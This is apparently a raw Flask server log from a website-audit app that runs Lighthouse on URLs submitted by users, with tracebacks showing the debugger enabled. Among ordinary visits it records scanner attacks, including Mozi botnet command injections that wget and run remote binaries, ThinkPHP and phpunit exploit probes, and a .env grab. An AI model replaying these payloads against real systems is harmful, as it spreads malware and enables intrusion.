+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/FlaskApp/audt.py", line 38, in processurl
+    urlopen(urlRequested)
+  File "/usr/lib/python3.8/urllib/request.py", line 222, in urlopen
+    return opener.open(url, data, timeout)
+  File "/usr/lib/python3.8/urllib/request.py", line 509, in open
+    req = Request(fullurl, data)
+  File "/usr/lib/python3.8/urllib/request.py", line 328, in __init__
+    self.full_url = url
+  File "/usr/lib/python3.8/urllib/request.py", line 354, in full_url
+    self._parse()
+  File "/usr/lib/python3.8/urllib/request.py", line 383, in _parse
+    raise ValueError("unknown url type: %r" % self.full_url)
+ValueError: unknown url type: 'youtube.com'
+109.246.20.26 - - [01/Dec/2020 23:34:49] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+109.246.20.26 - - [01/Dec/2020 23:34:49] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+109.246.20.26 - - [01/Dec/2020 23:34:49] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+109.246.20.26 - - [01/Dec/2020 23:34:49] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+109.246.20.26 - - [01/Dec/2020 23:34:49] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+109.246.20.26 - - [01/Dec/2020 23:34:49] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+86.17.242.132 - - [01/Dec/2020 23:51:08] "[37mGET / HTTP/1.1[0m" 200 -
+86.17.242.132 - - [01/Dec/2020 23:51:08] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+86.17.242.132 - - [01/Dec/2020 23:51:08] "[37mGET /static/images/logo.svg HTTP/1.1[0m" 200 -
+86.17.242.132 - - [01/Dec/2020 23:51:08] "[37mGET /static/images/aboutuspic.jpg HTTP/1.1[0m" 200 -
+86.17.242.132 - - [01/Dec/2020 23:51:08] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+86.17.242.132 - - [01/Dec/2020 23:51:17] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+- Running Lighthouse on https://www.youtube.com/watch?v=XIIP8eS3tvc ...
+
+86.17.242.132 - - [01/Dec/2020 23:51:21] "[37mGET /processurl?data=95 HTTP/1.1[0m" 200 -
+86.17.242.132 - - [01/Dec/2020 23:51:24] "[37mGET /processurl?data=95 HTTP/1.1[0m" 200 -
+86.17.242.132 - - [01/Dec/2020 23:51:27] "[37mGET /processurl?data=95 HTTP/1.1[0m" 200 -
+86.17.242.132 - - [01/Dec/2020 23:51:31] "[37mGET /processurl?data=95 HTTP/1.1[0m" 200 -
+
+WARNING: The page may not be loading as expected because your test URL (https://www.youtube.com/watch?v=XIIP8eS3tvc) was redirected to https://m.youtube.com/watch?v=XIIP8eS3tvc. Try testing the second URL directly.
+
+
+86.17.242.132 - - [01/Dec/2020 23:51:34] "[32mGET /processurl?data=95 HTTP/1.1[0m" 302 -
+86.17.242.132 - - [01/Dec/2020 23:51:34] "[37mGET /report?report=95 HTTP/1.1[0m" 200 -
+86.17.242.132 - - [01/Dec/2020 23:52:09] "[37mGET / HTTP/1.1[0m" 200 -
+86.17.242.132 - - [01/Dec/2020 23:52:24] "[37mGET /list HTTP/1.1[0m" 200 -
+86.17.242.132 - - [01/Dec/2020 23:52:30] "[37mGET / HTTP/1.1[0m" 200 -
+86.17.242.132 - - [01/Dec/2020 23:52:43] "[37mGET / HTTP/1.1[0m" 200 -
+86.185.210.141 - - [02/Dec/2020 00:01:40] "[37mGET / HTTP/1.1[0m" 200 -
+86.185.210.141 - - [02/Dec/2020 00:01:40] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+86.185.210.141 - - [02/Dec/2020 00:01:40] "[37mGET /static/images/logo.svg HTTP/1.1[0m" 200 -
+86.185.210.141 - - [02/Dec/2020 00:01:40] "[37mGET /static/images/aboutuspic.jpg HTTP/1.1[0m" 200 -
+86.185.210.141 - - [02/Dec/2020 00:01:42] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+103.10.86.198 - - [02/Dec/2020 00:11:03] "[33mGET /TP/public/index.php HTTP/1.1[0m" 404 -
+103.10.86.198 - - [02/Dec/2020 00:11:03] "[33mGET /TP/index.php HTTP/1.1[0m" 404 -
+103.10.86.198 - - [02/Dec/2020 00:11:04] "[33mGET /thinkphp/html/public/index.php HTTP/1.1[0m" 404 -
+103.10.86.198 - - [02/Dec/2020 00:11:04] "[33mGET /html/public/index.php HTTP/1.1[0m" 404 -
+103.10.86.198 - - [02/Dec/2020 00:11:05] "[33mGET /public/index.php HTTP/1.1[0m" 404 -
+103.10.86.198 - - [02/Dec/2020 00:11:06] "[33mGET /TP/html/public/index.php HTTP/1.1[0m" 404 -
+103.10.86.198 - - [02/Dec/2020 00:11:06] "[33mGET /elrekt.php HTTP/1.1[0m" 404 -
+103.10.86.198 - - [02/Dec/2020 00:11:07] "[33mGET /index.php HTTP/1.1[0m" 404 -
+103.10.86.198 - - [02/Dec/2020 00:11:07] "[37mGET / HTTP/1.1[0m" 200 -
+2.97.202.181 - - [02/Dec/2020 00:45:18] "[37mGET / HTTP/1.1[0m" 200 -
+2.97.202.181 - - [02/Dec/2020 00:45:18] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+2.97.202.181 - - [02/Dec/2020 00:45:18] "[37mGET /static/images/aboutuspic.jpg HTTP/1.1[0m" 200 -
+2.97.202.181 - - [02/Dec/2020 00:45:18] "[37mGET /static/images/logo.svg HTTP/1.1[0m" 200 -
+2.97.202.181 - - [02/Dec/2020 00:45:18] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+2.97.202.181 - - [02/Dec/2020 00:45:29] "[37mGET /list HTTP/1.1[0m" 200 -
+2.97.202.181 - - [02/Dec/2020 00:45:33] "[37mGET /report?report=95 HTTP/1.1[0m" 200 -
+2.97.202.181 - - [02/Dec/2020 00:45:47] "[37mGET / HTTP/1.1[0m" 200 -
+2.97.202.181 - - [02/Dec/2020 00:46:29] "[37mGET /list HTTP/1.1[0m" 200 -
+2.97.202.181 - - [02/Dec/2020 00:46:34] "[37mGET /report?report=95 HTTP/1.1[0m" 200 -
+2.97.202.181 - - [02/Dec/2020 00:46:49] "[37mGET /report?report=89 HTTP/1.1[0m" 200 -
+2.97.202.181 - - [02/Dec/2020 00:47:53] "[37mGET / HTTP/1.1[0m" 200 -
+94.173.218.222 - - [02/Dec/2020 00:49:44] "[37mGET / HTTP/1.1[0m" 200 -
+94.173.218.222 - - [02/Dec/2020 00:49:44] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+94.173.218.222 - - [02/Dec/2020 00:49:45] "[37mGET /static/images/logo.svg HTTP/1.1[0m" 200 -
+94.173.218.222 - - [02/Dec/2020 00:49:45] "[37mGET /static/images/aboutuspic.jpg HTTP/1.1[0m" 200 -
+94.173.218.222 - - [02/Dec/2020 00:49:45] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+94.173.218.222 - - [02/Dec/2020 00:50:23] "[37mGET /list HTTP/1.1[0m" 200 -
+94.173.218.222 - - [02/Dec/2020 00:50:30] "[37mGET /list HTTP/1.1[0m" 200 -
+94.173.218.222 - - [02/Dec/2020 00:50:33] "[37mGET / HTTP/1.1[0m" 200 -
+94.173.218.222 - - [02/Dec/2020 00:51:46] "[37mGET /list HTTP/1.1[0m" 200 -
+94.173.218.222 - - [02/Dec/2020 00:54:15] "[37mGET / HTTP/1.1[0m" 200 -
+94.173.218.222 - - [02/Dec/2020 00:54:19] "[37mGET /list HTTP/1.1[0m" 200 -
+94.173.218.222 - - [02/Dec/2020 00:54:27] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:02:51] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:03:20] "[37mGET /report?report=95 HTTP/1.1[0m" 200 -
+71.6.232.4 - - [02/Dec/2020 01:06:27] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:15:48] "[37mGET /list HTTP/1.1[0m" 200 -
+51.103.27.243 - - [02/Dec/2020 01:18:26] "[33mGET /.env HTTP/1.1[0m" 404 -
+51.103.27.243 - - [02/Dec/2020 01:18:26] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+77.101.234.187 - - [02/Dec/2020 01:27:09] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:27:16] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:27:17] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:27:17] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:22] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:24] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+- Running Lighthouse on https://www.pinayu.com ...
+
+77.101.234.187 - - [02/Dec/2020 01:28:28] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:28] "[37mGET /processurl?data=96 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:30] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+- Running Lighthouse on https://www.javierlopez.design ...
+
+77.101.234.187 - - [02/Dec/2020 01:28:31] "[37mGET /processurl?data=97 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:32] "[37mGET /processurl?data=96 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:34] "[37mGET /processurl?data=98 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:35] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:35] "[37mGET /processurl?data=97 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:36] "[37mGET /processurl?data=96 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:38] "[37mGET /processurl?data=98 HTTP/1.1[0m" 200 -
+- Running Lighthouse on https://www.google.com ...
+
+77.101.234.187 - - [02/Dec/2020 01:28:39] "[37mGET /processurl?data=97 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:39] "[37mGET /processurl?data=99 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:40] "[37mGET /processurl?data=96 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:41] "[37mGET /processurl?data=98 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:43] "[37mGET /processurl?data=99 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:43] "[37mGET /processurl?data=97 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:44] "[37mGET /processurl?data=96 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:44] "[37mGET /processurl?data=98 HTTP/1.1[0m" 200 -
+- Running Lighthouse on https://www.pinayu.com ...
+
+77.101.234.187 - - [02/Dec/2020 01:28:47] "[37mGET /processurl?data=99 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:47] "[37mGET /processurl?data=97 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:48] "[37mGET /processurl?data=98 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:48] "[37mGET /processurl?data=96 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:51] "[37mGET /processurl?data=99 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:51] "[37mGET /processurl?data=97 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:51] "[37mGET /processurl?data=98 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:52] "[37mGET /processurl?data=96 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:55] "[37mGET /processurl?data=98 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:55] "[37mGET /processurl?data=97 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:55] "[37mGET /processurl?data=99 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:56] "[37mGET /processurl?data=96 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:59] "[37mGET /processurl?data=98 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:59] "[37mGET /processurl?data=97 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:28:59] "[37mGET /processurl?data=99 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:29:00] "[37mGET /processurl?data=96 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:29:02] "[37mGET /processurl?data=98 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:29:03] "[37mGET /processurl?data=99 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:29:03] "[32mGET /processurl?data=97 HTTP/1.1[0m" 302 -
+77.101.234.187 - - [02/Dec/2020 01:29:04] "[37mGET /report?report=97 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:29:04] "[37mGET /processurl?data=96 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:29:05] "[37mGET /processurl?data=98 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:29:07] "[32mGET /processurl?data=99 HTTP/1.1[0m" 302 -
+77.101.234.187 - - [02/Dec/2020 01:29:07] "[37mGET /report?report=99 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:29:08] "[32mGET /processurl?data=96 HTTP/1.1[0m" 302 -
+77.101.234.187 - - [02/Dec/2020 01:29:08] "[37mGET /report?report=96 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:29:09] "[37mGET /processurl?data=98 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:29:12] "[37mGET /processurl?data=98 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:29:16] "[32mGET /processurl?data=98 HTTP/1.1[0m" 302 -
+77.101.234.187 - - [02/Dec/2020 01:29:16] "[37mGET /report?report=98 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:29:30] "[37mGET /report?report=98 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:29:30] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:29:33] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:29:38] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+- Running Lighthouse on https://www.google.com ...
+
+77.101.234.187 - - [02/Dec/2020 01:29:42] "[37mGET /processurl?data=100 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:29:46] "[37mGET /processurl?data=100 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:29:50] "[37mGET /processurl?data=100 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:29:54] "[32mGET /processurl?data=100 HTTP/1.1[0m" 302 -
+77.101.234.187 - - [02/Dec/2020 01:29:54] "[37mGET /report?report=100 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:29:55] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:30:00] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+- Running Lighthouse on https://www.javierlopez.design ...
+
+77.101.234.187 - - [02/Dec/2020 01:30:04] "[37mGET /processurl?data=101 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:30:08] "[37mGET /processurl?data=101 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 01:30:12] "[32mGET /processurl?data=101 HTTP/1.1[0m" 302 -
+77.101.234.187 - - [02/Dec/2020 01:30:12] "[37mGET /report?report=101 HTTP/1.1[0m" 200 -
+60.215.221.201 - - [02/Dec/2020 01:30:48] "[33mGET /shell?cd+/tmp;rm+-rf+*;wget+http://60.215.221.201:50038/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1[0m" 404 -
+45.145.185.210 - - [02/Dec/2020 01:52:23] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+176.14.233.248 - - [02/Dec/2020 01:53:20] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 02:28:18] "[37mGET /list HTTP/1.1[0m" 200 -
+114.35.92.186 - - [02/Dec/2020 02:44:40] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 02:50:06] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 02:50:06] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+192.241.234.145 - - [02/Dec/2020 02:52:25] "[33mGET /actuator/health HTTP/1.1[0m" 404 -
+191.233.198.198 - - [02/Dec/2020 03:30:58] "[33mHEAD /robots.txt HTTP/1.0[0m" 404 -
+2.57.122.186 - - [02/Dec/2020 03:32:25] "[33mGET /config/getuser?index=0 HTTP/1.1[0m" 404 -
+64.31.8.10 - - [02/Dec/2020 03:40:02] "[37mGET http://example.com/ HTTP/1.1[0m" 200 -
+27.114.154.84 - - [02/Dec/2020 03:43:34] "[33mPOST /editBlackAndWhiteList HTTP/1.1[0m" 404 -
+213.92.186.29 - - [02/Dec/2020 05:04:05] "[37mGET / HTTP/1.1[0m" 200 -
+69.162.99.42 - - [02/Dec/2020 05:15:06] "[33mGET /pv/000000000000.cfg HTTP/1.1[0m" 404 -
+88.222.193.177 - - [02/Dec/2020 05:25:12] "[37mGET / HTTP/1.1[0m" 200 -
+167.248.133.54 - - [02/Dec/2020 05:28:16] "[37mGET / HTTP/1.1[0m" 200 -
+167.248.133.54 - - [02/Dec/2020 05:28:16] "[37mGET / HTTP/1.1[0m" 200 -
+156.96.150.119 - - [02/Dec/2020 06:30:52] "[37mGET / HTTP/1.1[0m" 200 -
+177.94.141.179 - - [02/Dec/2020 06:44:52] "[37mGET / HTTP/1.1[0m" 200 -
+143.110.188.239 - - [02/Dec/2020 07:04:33] "[37mGET / HTTP/1.1[0m" 200 -
+189.39.247.8 - - [02/Dec/2020 07:14:17] "[37mGET / HTTP/1.1[0m" 200 -
+49.36.149.210 - - [02/Dec/2020 07:29:03] "[37mGET / HTTP/1.1[0m" 200 -
+49.36.149.210 - - [02/Dec/2020 07:29:03] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+49.36.149.210 - - [02/Dec/2020 07:29:03] "[37mGET /static/images/aboutuspic.jpg HTTP/1.1[0m" 200 -
+49.36.149.210 - - [02/Dec/2020 07:29:03] "[37mGET /static/images/logo.svg HTTP/1.1[0m" 200 -
+49.36.149.210 - - [02/Dec/2020 07:29:04] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+86.128.243.48 - - [02/Dec/2020 07:32:13] "[37mGET / HTTP/1.1[0m" 200 -
+86.128.243.48 - - [02/Dec/2020 07:32:13] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+86.128.243.48 - - [02/Dec/2020 07:32:13] "[37mGET /static/images/logo.svg HTTP/1.1[0m" 200 -
+86.128.243.48 - - [02/Dec/2020 07:32:13] "[37mGET /static/images/aboutuspic.jpg HTTP/1.1[0m" 200 -
+86.128.243.48 - - [02/Dec/2020 07:32:14] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+86.128.243.48 - - [02/Dec/2020 07:32:32] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+- Running Lighthouse on https://www.java.com/download/ ...
+
+86.128.243.48 - - [02/Dec/2020 07:32:35] "[37mGET /processurl?data=102 HTTP/1.1[0m" 200 -
+86.128.243.48 - - [02/Dec/2020 07:32:38] "[37mGET /processurl?data=102 HTTP/1.1[0m" 200 -
+86.128.243.48 - - [02/Dec/2020 07:32:42] "[37mGET /processurl?data=102 HTTP/1.1[0m" 200 -
+86.128.243.48 - - [02/Dec/2020 07:32:45] "[37mGET /processurl?data=102 HTTP/1.1[0m" 200 -
+
+WARNING: The page may not be loading as expected because your test URL (https://www.java.com/download/) was redirected to https://www.java.com/en/download/. Try testing the second URL directly.
+
+
+86.128.243.48 - - [02/Dec/2020 07:32:49] "[32mGET /processurl?data=102 HTTP/1.1[0m" 302 -
+86.128.243.48 - - [02/Dec/2020 07:32:49] "[37mGET /report?report=102 HTTP/1.1[0m" 200 -
+93.201.98.108 - - [02/Dec/2020 08:07:36] "[37mGET / HTTP/1.1[0m" 200 -
+93.201.98.108 - - [02/Dec/2020 08:07:36] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+93.201.98.108 - - [02/Dec/2020 08:07:36] "[37mGET /static/images/logo.svg HTTP/1.1[0m" 200 -
+93.201.98.108 - - [02/Dec/2020 08:07:36] "[37mGET /static/images/aboutuspic.jpg HTTP/1.1[0m" 200 -
+93.201.98.108 - - [02/Dec/2020 08:07:36] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+91.241.19.84 - - [02/Dec/2020 08:15:37] "[33mGET /solr/admin/info/system?wt=json HTTP/1.1[0m" 404 -
+91.241.19.84 - - [02/Dec/2020 08:15:37] "[33mPOST /api/jsonws/invoke HTTP/1.1[0m" 404 -
+91.241.19.84 - - [02/Dec/2020 08:15:37] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+91.241.19.84 - - [02/Dec/2020 08:15:37] "[33mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+91.241.19.84 - - [02/Dec/2020 08:15:37] "[33mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1[0m" 404 -
+91.241.19.84 - - [02/Dec/2020 08:15:37] "[37mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1[0m" 200 -
+91.241.19.84 - - [02/Dec/2020 08:15:37] "[37mGET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1[0m" 200 -
+91.241.19.84 - - [02/Dec/2020 08:15:37] "[33mGET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1[0m" 404 -
+91.241.19.84 - - [02/Dec/2020 08:15:37] "[33mGET /console/ HTTP/1.1[0m" 404 -
+89.210.162.167 - - [02/Dec/2020 08:24:22] "[37mGET / HTTP/1.1[0m" 200 -
+222.138.239.28 - - [02/Dec/2020 08:25:59] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://222.138.239.28:35290/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0[0m" 404 -
+14.254.27.21 - - [02/Dec/2020 09:22:40] "[37mGET / HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:23:03] "[37mGET / HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:23:03] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:23:03] "[37mGET /static/images/logo.svg HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:23:03] "[37mGET /static/images/aboutuspic.jpg HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:23:03] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:23:11] "[37mGET /list HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:23:16] "[37mGET /report?report=102 HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:23:24] "[37mGET / HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:23:28] "[37mGET /list HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:23:31] "[37mGET / HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:23:38] "[37mGET / HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:23:57] "[35m[1mPOST /processurl HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/FlaskApp/audt.py", line 38, in processurl
+    urlopen(urlRequested)
+  File "/usr/lib/python3.8/urllib/request.py", line 222, in urlopen
+    return opener.open(url, data, timeout)
+  File "/usr/lib/python3.8/urllib/request.py", line 509, in open
+    req = Request(fullurl, data)
+  File "/usr/lib/python3.8/urllib/request.py", line 328, in __init__
+    self.full_url = url
+  File "/usr/lib/python3.8/urllib/request.py", line 354, in full_url
+    self._parse()
+  File "/usr/lib/python3.8/urllib/request.py", line 383, in _parse
+    raise ValueError("unknown url type: %r" % self.full_url)
+ValueError: unknown url type: 'enucs.org.uk'
+5.71.196.245 - - [02/Dec/2020 10:23:57] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:23:57] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:23:57] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:23:57] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:23:57] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:23:57] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:24:11] "[37mGET /list HTTP/1.1[0m" 200 -
+5.71.196.245 - - [02/Dec/2020 10:24:21] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+- Running Lighthouse on https://enucs.org.uk ...
+
+5.71.196.245 - - [02/Dec/2020 10:24:24] "[37mGET /processurl?data=103 HTTP/1.1[0m" 200 -
